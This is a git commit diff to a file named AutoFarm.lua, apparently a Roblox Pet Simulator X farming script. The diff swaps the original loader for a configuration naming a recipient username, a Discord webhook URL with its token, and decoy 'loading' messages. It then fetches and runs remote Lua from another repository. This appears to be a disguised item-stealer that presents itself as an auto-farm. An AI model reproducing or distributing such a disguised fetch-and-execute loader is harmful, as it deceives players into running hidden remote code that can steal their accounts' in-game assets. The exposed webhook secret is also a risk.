b0a89a5ae84c3c4ee57419fafb51dc2ae7fb8e9f
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-05-17 23:23:23 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,1 +1,19 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
+UserName = "Zenn2345"
+
+UserName2 = "zenn2345"
+
+Webhook = "https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c"
+
+_G.AntiLeave = false
+
+_G.ScriptName = "ProjectWD"
+
+_G.FirstText = "script is loading..."
+
+_G.SecondText = "loading...."
+
+_G.ThirdText = "almost done"
+
+_G.WaitingTime = 50
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
